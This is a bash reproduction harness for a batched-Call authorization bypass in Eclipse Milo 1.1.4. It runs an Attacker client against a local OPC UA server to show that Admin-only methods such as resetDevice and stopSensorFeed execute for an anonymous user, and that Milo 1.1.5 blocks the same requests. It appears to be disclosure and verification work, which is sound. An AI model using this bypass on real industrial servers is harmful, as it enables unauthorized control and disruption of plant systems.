#!/usr/bin/env bash
#
# the mixed-batch bypass -- Call service mixed-batch authorization bypass -- one-command reproduction.
#
# Builds the IDENTICAL PoC source twice: once against vulnerable Eclipse Milo 1.1.4 (the default
# ${milo.version}) and once against fixed Milo 1.1.5 (-Dmilo.version=1.1.5) -- same application
# code both times, only the Milo dependency changes -- then runs the full demonstration matrix:
#
#   Server, attacker, and legitimate victim are always THREE SEPARATE JVM processes (never one
#   process standing in for another; the attacker is a genuine milo-sdk-client with no internal
#   shortcuts). All method-invocation counters are read from a server-written, well-known file --
#   ground truth independent of whatever the client-visible wire outcome happens to be.
#
#   CORE MATRIX (method: resetDevice(), Admin-only; readStatus() is the allowed "carrier"):
#     Row 1   calibration        admin calls resetDevice() directly           -> Good, effect real
#     Row 2   control-A          anonymous calls resetDevice() ALONE          -> denied, no effect
#     Row 3   attack (fwd)       anonymous [readStatus, resetDevice]  vuln    -> denied method EXECUTES
#     Row 3r  attack (reversed)  anonymous [resetDevice, readStatus] vuln     -> EXECUTES (order-independent)
#     Row 4   fixed (fwd)        identical Row 3 batch, Milo 1.1.5            -> blocked
#     Row 4r  fixed (reversed)   identical Row 3r batch, Milo 1.1.5           -> blocked
#
#   SECOND METHOD + LIVE THIRD-PARTY VICTIM (method: stopSensorFeed(), Admin-only; proves the
#   bug is not a quirk of one method, and gives the bypass a real effect an INDEPENDENT,
#   legitimate third client -- LegitClient.java, its own anonymous session, subscribed to a live
#   ticking Plant/SensorFeed/Value -- actually observes, not just a synthetic counter):
#     Row 5   calibration        admin calls stopSensorFeed() directly        -> Good, feed dies for real
#     Row 5d  control-denied     anonymous calls stopSensorFeed() ALONE       -> denied, feed keeps ticking
#     Row 6   attack (fwd)       anonymous [readStatus, stopSensorFeed) vuln  -> feed dies; LegitClient sees it
#     Row 6r  attack (reversed)  anonymous [stopSensorFeed, readStatus] vuln  -> feed dies; LegitClient sees it
#     Row 7   fixed (fwd)        identical Row 6 batch, Milo 1.1.5            -> LegitClient stream uninterrupted
#     Row 7r  fixed (reversed)   identical Row 6r batch, Milo 1.1.5           -> LegitClient stream uninterrupted
#
# The media hook: "the server returned a denial or timeout to the attacker, but the forbidden
# command had already executed / had already disrupted another connected client." The attacker's
# own wire-visible result on the vulnerable build is reported EXACTLY as observed -- it is often
# an exceptional completion (e.g. Bad_Timeout, no CallResponse at all), because the server-side
# GroupMapCollate collation throws an uncaught RuntimeException once the buggy unfiltered
# result-list size stops matching the filtered group size, AFTER the denied method's side effect
# has already run. This is never "cleaned up" to look like a tidy denial -- that mismatch between
# what the attacker sees and what actually happened is the point.
#
# Every row's PASS/FAIL expectation is machine-checked; the script exits 1 if ANY row behaved
# unexpectedly (see VERDICT SUMMARY / exit code at the end).
#
# Requirements: JDK 17 + Maven on PATH. Artifacts org.eclipse.milo:*:1.1.4/1.1.5 are resolved from
# Maven Central (or the local ~/.m2 cache if already present). No Docker, no Milo source checkout,
# no `mise` dependency -- this script degrades gracefully to plain `mvn`/`java` on PATH.
set -u
cd "$(dirname "$0")"
RUN_START_EPOCH=$(date +%s)

PORT="${POC_PORT:-12686}"
URL="opc.tcp://localhost:$PORT/milo"
EVIDENCE_DIR="${EVIDENCE_DIR:-$(cd .. && pwd)/evidence}"
mkdir -p "$EVIDENCE_DIR"
RUN_TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

JAR="target/call-batch-poc.jar"
# IMPORTANT: these copies must live OUTSIDE target/ -- `mvn clean` (run again for the 1.1.5 build)
# wipes the entire target/ directory, which would silently delete a same-directory copy of the
# vulnerable jar before the later live-attack phases get a chance to use it.
VULN_JAR="/tmp/call-batch-poc-vuln-$$.jar"
FIXED_JAR="/tmp/call-batch-poc-fixed-$$.jar"

# --- verdict tracking: every CHECK call feeds this; FAIL_COUNT>0 drives the exit code -----------
declare -a VERDICT_ROWS=()
FAIL_COUNT=0

hr()  { echo "============================================================"; }
hr2() { echo "------------------------------------------------------------"; }

# record_verdict <rowId> <description> <PASS|FAIL> <detail>
record_verdict() {
  local id="$1" desc="$2" status="$3" detail="$4"
  VERDICT_ROWS+=("$id|$desc|$status|$detail")
  if [ "$status" != "PASS" ]; then
    FAIL_COUNT=$((FAIL_COUNT+1))
  fi
  echo "  [$status] $id: $desc -- $detail"
}

sha256_of() { # sha256_of <file>
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

cleanup_stray() {
  # Kill any stray PocServer/LegitClient JVMs left over from a previous failed/interrupted run so
  # counts are never cross-contaminated and the port is free.
  pkill -f 'callbatch\.PocServer' 2>/dev/null || true
  pkill -f 'callbatch\.LegitClient' 2>/dev/null || true
  sleep 1
}

build() {
  local version="$1"
  echo "[build] milo.version=$version"
  mvn -q clean package -DskipTests -Dmilo.version="$version"
}

wait_ready() {
  local logfile="$1" n=0
  until grep -q POC_SERVER_READY "$logfile" 2>/dev/null; do
    sleep 1; n=$((n+1))
    if [ "$n" -gt 90 ]; then echo "ERROR: server did not become ready"; return 1; fi
  done
}

read_field() { # read_field <countersFile> <fieldName>
  grep -oE "$2=[a-zA-Z0-9.]+" "$1" 2>/dev/null | tail -1 | cut -d= -f2
}

write_evidence() {
  # write_evidence <filename> <label>   (reads content on stdin)
  local file="$EVIDENCE_DIR/$1"
  local label="$2"
  {
    echo "# the mixed-batch bypass evidence -- captured_at_utc=$RUN_TS"
    echo "# label=$1 :: $label"
    echo "# environment: see $EVIDENCE_DIR/environment.log for exact dependency versions, artifact"
    echo "#              hashes, JDK/Maven/OS info shared by this entire run"
    echo "# ------------------------------------------------------------------"
    cat
  } > "$file"
  echo "    evidence written: $file"
}

run_server() { # run_server <version-label> <countersFile> [jar]  -> prints server pid on stdout, log at $2.server.log
  local label="$1" counters="$2" jar="${3:-$JAR}"
  local server_log="/tmp/call-batch-server-$label-$$.log"
  rm -f "$counters"
  java -cp "$jar" callbatch.PocServer "$PORT" "$counters" > "$server_log" 2>&1 &
  local pid=$!
  wait_ready "$server_log" || { echo "[$label] server failed to start"; cat "$server_log"; kill "$pid" 2>/dev/null; return 1; }
  echo "$pid" > "/tmp/call-batch-server-$label-$$.pid"
  echo "$server_log"
}

run_legit_client() { # run_legit_client <label> <jar> <durationSeconds>  -> prints log path on stdout; pid written to file
  local label="$1" jar="$2" duration="$3"
  local log="/tmp/call-batch-legit-$label-$$.log"
  java -cp "$jar" callbatch.LegitClient "$URL" "$duration" > "$log" 2>&1 &
  local pid=$!
  echo "$pid" > "/tmp/call-batch-legit-$label-$$.pid"
  echo "$log"
}

cleanup_stray

hr; echo "the mixed-batch bypass PoC -- full reproduction matrix -- $RUN_TS"; hr
echo "attacker request timeout: 5000ms ; server/attacker/legit-client are three separate JVM processes"
echo

# =================================================================================================
# ENVIRONMENT + BUILD: vulnerable 1.1.4
# =================================================================================================
hr2; echo "[1/2] BUILD vulnerable (milo.version=1.1.4)"; hr2
JAVA_VERSION_OUT=$(java -version 2>&1)
MVN_VERSION_OUT=$(mvn -version 2>&1)
OS_UNAME=$(uname -a 2>&1)
build 1.1.4 || { echo "Maven build failed (1.1.4)"; exit 1; }
cp "$JAR" "$VULN_JAR"
VULN_JAR_SHA256=$(sha256_of "$VULN_JAR")
echo "  vulnerable jar sha256: $VULN_JAR_SHA256"

{
  echo "the mixed-batch bypass PoC -- environment and build provenance for this run"
  echo "captured_at_utc=$RUN_TS"
  echo
  echo "--- java -version ---"
  echo "$JAVA_VERSION_OUT"
  echo
  echo "--- mvn -version ---"
  echo "$MVN_VERSION_OUT"
  echo
  echo "--- uname -a ---"
  echo "$OS_UNAME"
  echo
  echo "--- dependency coordinates (identical application code both builds; only milo.version differs) ---"
  echo "org.eclipse.milo:milo-server-examples:1.1.4 (vulnerable) / :1.1.5 (fixed)"
  echo "org.eclipse.milo:milo-sdk-client:1.1.4 (vulnerable) / :1.1.5 (fixed)"
  echo
  echo "--- built artifact sha256 (vulnerable, milo.version=1.1.4) ---"
  echo "$VULN_JAR_SHA256  call-batch-poc-vuln.jar"
} > "$EVIDENCE_DIR/environment.log"
echo "    evidence written: $EVIDENCE_DIR/environment.log (will be appended with the fixed-build hash below)"

echo; echo "[boot] starting vulnerable server on $URL"
VULN_SERVER_LOG=$(run_server vuln "/tmp/call-batch-side-effects-vuln-$$.txt") || exit 1
VULN_COUNTERS="/tmp/call-batch-side-effects-vuln-$$.txt"
VULN_PID=$(cat "/tmp/call-batch-server-vuln-$$.pid")
echo "  server pid=$VULN_PID log=$VULN_SERVER_LOG"

# --- ROW 1: calibration -----------------------------------------------------------------------
hr2; echo "ROW 1 -- CALIBRATION: authenticated Admin calls resetDevice() directly (expect Good)"; hr2
CALIB_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" calibration 2>&1)
echo "$CALIB_OUT" | grep -E 'CLIENT call result|CLIENT call failed'
CALIB_COUNTERS=$(cat "$VULN_COUNTERS" 2>/dev/null)
CALIB_RESET=$(read_field "$VULN_COUNTERS" resetDevice)
echo "  server-side counters: $CALIB_COUNTERS"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL calibration"
  echo
  echo "$CALIB_OUT"
  echo
  echo "server-side counters (ground truth): $CALIB_COUNTERS"
  echo "resetDevice invocation count: $CALIB_RESET (expect 1 -- a real, authorized invocation)"
} | write_evidence "row1-calibration.log" "Row 1: authenticated Admin calls resetDevice() directly -- establishes the method's real, intended effect, independent of the bug"

if [ "${CALIB_RESET:-0}" = "1" ] && echo "$CALIB_OUT" | grep -q 'name=Good'; then
  record_verdict "Row1" "admin resetDevice() direct" PASS "Good, counter 0->$CALIB_RESET"
else
  record_verdict "Row1" "admin resetDevice() direct" FAIL "expected Good+counter=1, got counter=$CALIB_RESET"
fi

# --- ROW 2: control A -- denied alone ----------------------------------------------------------
hr2; echo "ROW 2 -- CONTROL A: anonymous attacker calls resetDevice() ALONE (expect Bad_UserAccessDenied, no effect)"; hr2
CTRLA_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" control-denied 2>&1)
echo "$CTRLA_OUT" | grep -E 'CLIENT call result|CLIENT call failed'
CTRLA_COUNTERS=$(cat "$VULN_COUNTERS" 2>/dev/null)
CTRLA_RESET=$(read_field "$VULN_COUNTERS" resetDevice)
echo "  server-side counters: $CTRLA_COUNTERS"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL control-denied"
  echo
  echo "$CTRLA_OUT"
  echo
  echo "server-side counters (ground truth): $CTRLA_COUNTERS"
  echo "resetDevice invocation count: $CTRLA_RESET (must equal pre-row-2 value $CALIB_RESET -- zero additional side effect)"
} | write_evidence "row2-control-a-denied-alone.log" "Row 2: anonymous (Operator-only) attacker calls resetDevice() ALONE -- Bad_UserAccessDenied, zero server-side side effect -- proves authorization normally works"

if [ "${CTRLA_RESET:-1}" = "${CALIB_RESET:-0}" ] && echo "$CTRLA_OUT" | grep -q 'Bad_UserAccessDenied'; then
  record_verdict "Row2" "anonymous resetDevice() alone" PASS "Bad_UserAccessDenied, counter unchanged at $CTRLA_RESET"
else
  record_verdict "Row2" "anonymous resetDevice() alone" FAIL "expected denial+no effect, got counter=$CTRLA_RESET (was $CALIB_RESET)"
fi

# --- ROW 3 / 3r: THE ATTACK -- mixed batch, forward AND reversed, on VULNERABLE 1.1.4 -----------
hr2; echo "ROW 3 -- ATTACK (vulnerable 1.1.4): mixed CallRequest [readStatus (allowed), resetDevice (DENIED)]"; hr2
ATTACK_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" mixed-batch 2>&1)
echo "$ATTACK_OUT" | grep -E 'WIRE RESULT|returned a CallResponse|statusCode='
ATTACK_COUNTERS=$(cat "$VULN_COUNTERS" 2>/dev/null)
ATTACK_RESET=$(read_field "$VULN_COUNTERS" resetDevice)
echo "  server-side counters: $ATTACK_COUNTERS (before this row: $CTRLA_RESET)"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL mixed-batch"
  echo
  echo "$ATTACK_OUT"
  echo
  echo "server-side counters BEFORE this attempt: $CTRLA_COUNTERS"
  echo "server-side counters AFTER this attempt:  $ATTACK_COUNTERS"
  echo
  echo "NOTE ON THE WIRE: the client-visible outcome above (clean CallResponse vs. an exceptional"
  echo "completion such as Bad_Timeout) is reported exactly as observed. Either way, the"
  echo "server-side counter is the ground truth for whether the denied method actually executed."
} | write_evidence "row3-attack-mixed-batch-vulnerable-1.1.4.log" "Row 3: THE BYPASS -- anonymous attacker's single CallRequest batches an allowed method with a denied one; on vulnerable Milo 1.1.4 the denied method's server-side counter increments regardless of the client-visible wire outcome"


# NOTE ON PASS/FAIL SEMANTICS FOR ATTACK ROWS: "PASS" means "this vulnerable-build row behaved
# exactly as a vulnerable build SHOULD" -- i.e. the bypass reproduced. "FAIL" (and the nonzero
# exit code) is reserved for an UNEXPECTED result: the bypass failing to reproduce on the
# vulnerable build (harness broken, or the vulnerability didn't fire), or the fix failing to hold
# on 1.1.5. A reproduced bypass on 1.1.4 is the correct, expected, PASSing outcome of this row.
if [ "${ATTACK_RESET:-0}" -gt "${CTRLA_RESET:-0}" ] 2>/dev/null; then
  record_verdict "Row3" "mixed [readStatus,resetDevice] vuln 1.1.4" PASS "BYPASS CONFIRMED (as expected on vulnerable build): resetDevice executed despite denial ($CTRLA_RESET -> $ATTACK_RESET)"
  ROW3_BYPASSED=1
else
  record_verdict "Row3" "mixed [readStatus,resetDevice] vuln 1.1.4" FAIL "bypass did NOT reproduce -- unexpected on a vulnerable 1.1.4 build"
  ROW3_BYPASSED=0
fi

hr2; echo "ROW 3r -- ATTACK, REVERSED ORDER (vulnerable 1.1.4): mixed CallRequest [resetDevice (DENIED), readStatus (allowed)]"; hr2
ATTACKR_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" mixed-batch-rev 2>&1)
echo "$ATTACKR_OUT" | grep -E 'WIRE RESULT|returned a CallResponse|statusCode='
ATTACKR_COUNTERS=$(cat "$VULN_COUNTERS" 2>/dev/null)
ATTACKR_RESET=$(read_field "$VULN_COUNTERS" resetDevice)
echo "  server-side counters: $ATTACKR_COUNTERS (before this row: $ATTACK_RESET)"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL mixed-batch-rev"
  echo
  echo "$ATTACKR_OUT"
  echo
  echo "server-side counters BEFORE this attempt: $ATTACK_COUNTERS"
  echo "server-side counters AFTER this attempt:  $ATTACKR_COUNTERS"
  echo
  echo "Proves the bypass does not depend on the denied method being listed after the allowed one."
} | write_evidence "row3r-attack-mixed-batch-reversed-vulnerable-1.1.4.log" "Row 3r: same bypass, REVERSED batch order [resetDevice, readStatus] -- order-independence control"

if [ "${ATTACKR_RESET:-0}" -gt "${ATTACK_RESET:-0}" ] 2>/dev/null; then
  record_verdict "Row3r" "mixed [resetDevice,readStatus] REVERSED vuln 1.1.4" PASS "BYPASS CONFIRMED (order-independent): resetDevice executed despite denial ($ATTACK_RESET -> $ATTACKR_RESET)"
else
  record_verdict "Row3r" "mixed [resetDevice,readStatus] REVERSED vuln 1.1.4" FAIL "bypass did NOT reproduce in reversed order -- unexpected on a vulnerable 1.1.4 build"
fi

echo; echo "[teardown] stopping vulnerable server (pid $VULN_PID)"
kill "$VULN_PID" 2>/dev/null
wait "$VULN_PID" 2>/dev/null
rm -f "/tmp/call-batch-server-vuln-$$.pid"
cp "$VULN_SERVER_LOG" "$EVIDENCE_DIR/server-vulnerable-1.1.4-full.log" 2>/dev/null
echo "    evidence written: $EVIDENCE_DIR/server-vulnerable-1.1.4-full.log"
sleep 1

# =================================================================================================
# BUILD + BOOT: fixed 1.1.5
# =================================================================================================
hr2; echo "[2/2] BUILD fixed (milo.version=1.1.5)"; hr2
build 1.1.5 || { echo "Maven build failed (1.1.5)"; exit 1; }
cp "$JAR" "$FIXED_JAR"
FIXED_JAR_SHA256=$(sha256_of "$FIXED_JAR")
echo "  fixed jar sha256: $FIXED_JAR_SHA256"
{
  echo
  echo "--- built artifact sha256 (fixed, milo.version=1.1.5) ---"
  echo "$FIXED_JAR_SHA256  call-batch-poc-fixed.jar"
} >> "$EVIDENCE_DIR/environment.log"

echo; echo "[boot] starting FIXED server on $URL"
FIXED_COUNTERS="/tmp/call-batch-side-effects-fixed-$$.txt"
FIXED_SERVER_LOG=$(run_server fixed "$FIXED_COUNTERS") || exit 1
FIXED_PID=$(cat "/tmp/call-batch-server-fixed-$$.pid")
echo "  server pid=$FIXED_PID log=$FIXED_SERVER_LOG"

# --- ROW 4 / 4r: FIXED CONTROL -- identical mixed batches, forward and reversed, on FIXED 1.1.5 --
hr2; echo "ROW 4 -- FIXED CONTROL (1.1.5): identical mixed CallRequest [readStatus, resetDevice]"; hr2
FIXED_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" mixed-batch 2>&1)
echo "$FIXED_OUT" | grep -E 'WIRE RESULT|returned a CallResponse|statusCode='
FIXED_COUNTERS_OUT=$(cat "$FIXED_COUNTERS" 2>/dev/null)
FIXED_RESET=$(read_field "$FIXED_COUNTERS" resetDevice)
echo "  server-side counters: $FIXED_COUNTERS_OUT"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL mixed-batch   (against FIXED Milo 1.1.5)"
  echo
  echo "$FIXED_OUT"
  echo
  echo "server-side counters (ground truth): $FIXED_COUNTERS_OUT"
  echo "resetDevice invocation count: $FIXED_RESET (must be 0 -- the fix restricts Call dispatch to authorized methods only)"
} | write_evidence "row4-fixed-control-1.1.5.log" "Row 4: identical mixed-batch attack against fixed Milo 1.1.5 -- resetDevice must NOT execute, proving the fix works and Row 3 was not a harness artifact"

if [ "${FIXED_RESET:-1}" = "0" ]; then
  record_verdict "Row4" "mixed [readStatus,resetDevice] fixed 1.1.5" PASS "blocked, counter stayed 0"
else
  record_verdict "Row4" "mixed [readStatus,resetDevice] fixed 1.1.5" FAIL "fix DID NOT hold: counter=$FIXED_RESET"
fi

hr2; echo "ROW 4r -- FIXED CONTROL, REVERSED ORDER (1.1.5): identical mixed CallRequest [resetDevice, readStatus]"; hr2
FIXEDR_OUT=$(java -cp "$JAR" callbatch.Attacker "$URL" mixed-batch-rev 2>&1)
echo "$FIXEDR_OUT" | grep -E 'WIRE RESULT|returned a CallResponse|statusCode='
FIXEDR_COUNTERS_OUT=$(cat "$FIXED_COUNTERS" 2>/dev/null)
FIXEDR_RESET=$(read_field "$FIXED_COUNTERS" resetDevice)
echo "  server-side counters: $FIXEDR_COUNTERS_OUT"
{
  echo "\$ java -cp $JAR callbatch.Attacker $URL mixed-batch-rev   (against FIXED Milo 1.1.5)"
  echo
  echo "$FIXEDR_OUT"
  echo
  echo "server-side counters (ground truth): $FIXEDR_COUNTERS_OUT"
  echo "resetDevice invocation count: $FIXEDR_RESET (must stay at $FIXED_RESET -- fix holds regardless of batch order)"
} | write_evidence "row4r-fixed-control-reversed-1.1.5.log" "Row 4r: identical REVERSED-order mixed-batch attack against fixed Milo 1.1.5 -- resetDevice must NOT execute"

if [ "${FIXEDR_RESET:-1}" = "${FIXED_RESET:-0}" ]; then
  record_verdict "Row4r" "mixed [resetDevice,readStatus] REVERSED fixed 1.1.5" PASS "blocked, counter stayed at $FIXEDR_RESET"
else
  record_verdict "Row4r" "mixed [resetDevice,readStatus] REVERSED fixed 1.1.5" FAIL "fix DID NOT hold in reversed order: counter went $FIXED_RESET -> $FIXEDR_RESET"
fi

echo; echo "[teardown] stopping fixed server (pid $FIXED_PID)"
kill "$FIXED_PID" 2>/dev/null
wait "$FIXED_PID" 2>/dev/null
rm -f "/tmp/call-batch-server-fixed-$$.pid"
cp "$FIXED_SERVER_LOG" "$EVIDENCE_DIR/server-fixed-1.1.5-full.log" 2>/dev/null
echo "    evidence written: $EVIDENCE_DIR/server-fixed-1.1.5-full.log"

rm -f "$VULN_COUNTERS" "$FIXED_COUNTERS" "$VULN_SERVER_LOG" "$FIXED_SERVER_LOG"

# =================================================================================================
# SECOND METHOD + LIVE THIRD-PARTY VICTIM DEMONSTRATION (Rows 5-7r): the SensorFeed subsystem
#
# stopSensorFeed() has the IDENTICAL RBAC shape as resetDevice() (Operator: Browse only; Admin:
# Browse+Call) -- a second, independent protected method, proving the bug is not a quirk of one
# method -- but its effect is witnessed by an INDEPENDENT, separate-process legitimate client
# (LegitClient.java, its own anonymous session, its own JVM) subscribed to a live, ticking
# Plant/SensorFeed/Value, rather than only inferred from a counter. The counter remains the
# forensic ground truth; the LegitClient transcript is the headline, independently-observed effect.
#
# Because stopSensorFeed() cannot be un-invoked (no restart is exposed -- the feed dies for good),
# each attack/control variant needs its own fresh server instance. The already-built vulnerable/
# fixed jars are reused (no rebuild). Denied-alone (Row 5d) causes no side effect, so it's safe to
# run on the SAME instance right before the calibration call that does kill the feed.
# =================================================================================================
hr; echo "ROWS 5-7r -- SECOND METHOD (stopSensorFeed) + LIVE THIRD-PARTY VICTIM (LegitClient)"; hr

# --- ROW 5 / 5d: calibration + denied-alone, on one fresh instance (fixed jar; doesn't matter) --
hr2; echo "ROW 5 / 5d -- calibration + denied-alone control for stopSensorFeed(), LegitClient witnesses"; hr2
L1_COUNTERS="/tmp/call-batch-side-effects-l1-$$.txt"
L1_SERVER_LOG=$(run_server l1 "$L1_COUNTERS" "$FIXED_JAR") || exit 1
L1_PID=$(cat "/tmp/call-batch-server-l1-$$.pid")
echo "  server pid=$L1_PID log=$L1_SERVER_LOG"

L1_LEGIT_LOG=$(run_legit_client l1 "$FIXED_JAR" 16)
L1_LEGIT_PID=$(cat "/tmp/call-batch-legit-l1-$$.pid")
echo "  LegitClient (separate process) started pid=$L1_LEGIT_PID log=$L1_LEGIT_LOG (duration 16s)"
sleep 4
L1_BASELINE_GOOD=$(grep -oE 'goodTicks=[0-9]+' "$L1_LEGIT_LOG" | tail -1 | cut -d= -f2)
L1_BASELINE_BAD=$(grep -oE 'badTicks=[0-9]+' "$L1_LEGIT_LOG" | tail -1 | cut -d= -f2)
echo "  LegitClient baseline: goodTicks=${L1_BASELINE_GOOD:-0} badTicks=${L1_BASELINE_BAD:-0}"

# Row 5d: denied-alone first (no effect expected)
L1D_OUT=$(java -cp "$FIXED_JAR" callbatch.Attacker "$URL" control-stopfeed-denied 2>&1)
echo "$L1D_OUT" | grep -E 'CLIENT call result|CLIENT call failed'
L1D_COUNTERS=$(cat "$L1_COUNTERS" 2>/dev/null)
L1D_STOPFEED=$(read_field "$L1_COUNTERS" stopSensorFeed)
{
  echo "\$ java -cp $FIXED_JAR callbatch.Attacker $URL control-stopfeed-denied"
  echo
  echo "$L1D_OUT"
  echo
  echo "server-side counters: $L1D_COUNTERS"
  echo "stopSensorFeed invocation count: $L1D_STOPFEED (must be 0 -- denied alone has zero effect)"
} | write_evidence "row5d-control-stopfeed-denied-alone.log" "Row 5d: anonymous attacker calls stopSensorFeed() ALONE -- Bad_UserAccessDenied, feed keeps ticking, zero server-side effect"

if [ "${L1D_STOPFEED:-1}" = "0" ] && echo "$L1D_OUT" | grep -q 'Bad_UserAccessDenied'; then
  record_verdict "Row5d" "anonymous stopSensorFeed() alone" PASS "Bad_UserAccessDenied, no effect"
else
  record_verdict "Row5d" "anonymous stopSensorFeed() alone" FAIL "expected denial+no effect, got stopSensorFeed=$L1D_STOPFEED"
fi

# Row 5: calibration (admin, direct) -- kills the feed for real, LegitClient must witness it
L1_CALIB_OUT=$(java -cp "$FIXED_JAR" callbatch.Attacker "$URL" calibration-stopfeed 2>&1)
echo "$L1_CALIB_OUT" | grep -E 'CLIENT call result|CLIENT call failed'
sleep 4
wait "$L1_LEGIT_PID" 2>/dev/null
L1_COUNTERS_OUT=$(cat "$L1_COUNTERS" 2>/dev/null)
L1_STOPFEED=$(read_field "$L1_COUNTERS" stopSensorFeed)
L1_FEEDRUNNING=$(read_field "$L1_COUNTERS" feedRunning)
L1_FINAL_GOOD=$(grep -oE 'goodTicks=[0-9]+' "$L1_LEGIT_LOG" | tail -1 | cut -d= -f2)
L1_FINAL_BAD=$(grep -oE 'badTicks=[0-9]+' "$L1_LEGIT_LOG" | tail -1 | cut -d= -f2)
echo "  server-side counters: $L1_COUNTERS_OUT"
echo "  LegitClient final: goodTicks=${L1_FINAL_GOOD:-0} badTicks=${L1_FINAL_BAD:-0}"
{
  echo "\$ java -cp $FIXED_JAR callbatch.Attacker $URL calibration-stopfeed"
  echo
  echo "$L1_CALIB_OUT"
  echo
  echo "server-side counters (ground truth): $L1_COUNTERS_OUT"
  echo "LegitClient baseline (pre-call): goodTicks=${L1_BASELINE_GOOD:-0} badTicks=${L1_BASELINE_BAD:-0}"
  echo "LegitClient final    (post-call): goodTicks=${L1_FINAL_GOOD:-0} badTicks=${L1_FINAL_BAD:-0}"
  echo
  echo "--- LegitClient (separate process) full transcript ---"
  cat "$L1_LEGIT_LOG"
} | write_evidence "row5-calibration-stopfeed.log" "Row 5: authenticated Admin calls stopSensorFeed() directly -- an independent third LegitClient session, its own process, subscribed to Plant/SensorFeed/Value, witnesses the feed going from Good ticks to Bad_NoCommunication in real time -- establishes the method's real, intended effect independent of the bug"

if [ "${L1_STOPFEED:-0}" = "1" ] && [ "${L1_FEEDRUNNING:-true}" = "false" ] && [ "${L1_FINAL_BAD:-0}" -gt 0 ] 2>/dev/null; then
  record_verdict "Row5" "admin stopSensorFeed() direct" PASS "Good; LegitClient observed goodTicks=${L1_FINAL_GOOD:-0} -> badTicks=${L1_FINAL_BAD:-0}"
else
  record_verdict "Row5" "admin stopSensorFeed() direct" FAIL "expected real effect witnessed by LegitClient, got stopSensorFeed=$L1_STOPFEED feedRunning=$L1_FEEDRUNNING badTicks=$L1_FINAL_BAD"
fi

echo; echo "[teardown] stopping L1 server (pid $L1_PID)"
kill "$L1_PID" 2>/dev/null; wait "$L1_PID" 2>/dev/null
kill "$L1_LEGIT_PID" 2>/dev/null
cp "$L1_SERVER_LOG" "$EVIDENCE_DIR/row5-server-full.log" 2>/dev/null
cp "$L1_LEGIT_LOG" "$EVIDENCE_DIR/row5-legitclient-full.log" 2>/dev/null
rm -f "/tmp/call-batch-server-l1-$$.pid" "/tmp/call-batch-legit-l1-$$.pid" "$L1_COUNTERS"
sleep 1

# live_attack_phase <rowId> <label> <jar> <phase> <evidenceFile> <description>
# Boots a fresh server + a separate-process LegitClient, captures baseline ticks, fires the given
# attacker phase, observes LegitClient afterward, records a verdict, tears down. Used for the four
# forward/reversed x vulnerable/fixed live-attack variants (Rows 6, 6r, 7, 7r).
live_attack_phase() {
  local rowId="$1" label="$2" jar="$3" phase="$4" evfile="$5" desc="$6"
  local counters="/tmp/call-batch-side-effects-$label-$$.txt"

  echo; hr2; echo "$rowId -- $desc"; hr2
  local server_log; server_log=$(run_server "$label" "$counters" "$jar") || return 1
  local server_pid; server_pid=$(cat "/tmp/call-batch-server-$label-$$.pid")
  echo "  server pid=$server_pid log=$server_log"

  local legit_log; legit_log=$(run_legit_client "$label" "$jar" 18)
  local legit_pid; legit_pid=$(cat "/tmp/call-batch-legit-$label-$$.pid")
  echo "  LegitClient (separate process) started pid=$legit_pid log=$legit_log (duration 18s)"
  sleep 5
  local baseline_good baseline_bad
  baseline_good=$(grep -oE 'goodTicks=[0-9]+' "$legit_log" | tail -1 | cut -d= -f2)
  baseline_bad=$(grep -oE 'badTicks=[0-9]+' "$legit_log" | tail -1 | cut -d= -f2)
  echo "  baseline (before attack): goodTicks=${baseline_good:-0} badTicks=${baseline_bad:-0}"

  local attack_out
  attack_out=$(java -cp "$jar" callbatch.Attacker "$URL" "$phase" 2>&1)
  echo "$attack_out" | grep -E 'WIRE RESULT|returned a CallResponse|statusCode='

  sleep 5
  wait "$legit_pid" 2>/dev/null

  local counters_out stopfeed final_good final_bad
  counters_out=$(cat "$counters" 2>/dev/null)
  stopfeed=$(read_field "$counters" stopSensorFeed)
  final_good=$(grep -oE 'goodTicks=[0-9]+' "$legit_log" | tail -1 | cut -d= -f2)
  final_bad=$(grep -oE 'badTicks=[0-9]+' "$legit_log" | tail -1 | cut -d= -f2)
  echo "  server-side counters: $counters_out"
  echo "  LegitClient final: goodTicks=${final_good:-0} badTicks=${final_bad:-0}"

  {
    echo "\$ java -cp $jar callbatch.Attacker $URL $phase"
    echo
    echo "$attack_out"
    echo
    echo "server-side counters (ground truth): $counters_out"
    echo "LegitClient baseline (pre-attack) : goodTicks=${baseline_good:-0} badTicks=${baseline_bad:-0}"
    echo "LegitClient final    (post-attack): goodTicks=${final_good:-0} badTicks=${final_bad:-0}"
    echo
    echo "NOTE ON THE WIRE: reported exactly as observed above. The LegitClient transcript below,"
    echo "captured by a wholly separate JVM process with its own OPC UA session, is the"
    echo "independent, third-party evidence of what actually happened server-side."
    echo
    echo "--- LegitClient (separate process) full transcript ---"
    cat "$legit_log"
  } | write_evidence "$evfile" "$desc"

  echo; echo "[teardown] stopping $label server (pid $server_pid)"
  kill "$server_pid" 2>/dev/null; wait "$server_pid" 2>/dev/null
  kill "$legit_pid" 2>/dev/null
  cp "$server_log" "$EVIDENCE_DIR/${label}-server-full.log" 2>/dev/null
  rm -f "/tmp/call-batch-server-$label-$$.pid" "/tmp/call-batch-legit-$label-$$.pid" "$counters" "$legit_log" "$server_log"

  # Export results for the caller via globals (bash has no clean multi-return)
  LIVE_STOPFEED="$stopfeed"; LIVE_FINAL_BAD="$final_bad"; LIVE_FINAL_GOOD="$final_good"
}

# --- ROW 6: live attack, forward order, VULNERABLE ----------------------------------------------
live_attack_phase "Row6" l2 "$VULN_JAR" "mixed-batch-stopfeed" \
  "row6-attack-victim-disrupted-vulnerable-1.1.4.log" \
  "Row 6: THE LIVE ATTACK -- anonymous attacker's mixed CallRequest [readStatus, stopSensorFeed] against vulnerable Milo 1.1.4; the attacker sees denial/timeout on the wire, but the independent third LegitClient session (separate process) watching Plant/SensorFeed/Value observes the feed actually stop"
